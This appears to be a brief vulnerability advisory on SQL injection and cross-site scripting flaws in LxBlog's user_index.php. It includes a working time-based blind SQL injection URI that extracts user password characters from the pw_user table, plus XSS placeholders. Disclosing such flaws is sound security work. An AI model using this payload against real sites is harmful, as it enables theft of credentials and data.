LxBlog is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.

Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

The following example URIs are available:

http://www.example.com/user_index.php?action=tag&job=modify&type=blog k LEFT JOIN pw_user i ON 1=1 WHERE i.uid =1 AND
if((ASCII(SUBSTRING(password,1,1))>0),sleep(10),1)/*&item_type[]=blog k LEFT JOIN pw_user i ON 1=1 WHERE i.uid =1 AND
if((ASCII(SUBSTRING(password,1,1))>0),sleep(10),1)/*

http://www.example.com/user_index.php?action=tag&job=modify&type=[XSS]&item_type[]=[XSS]
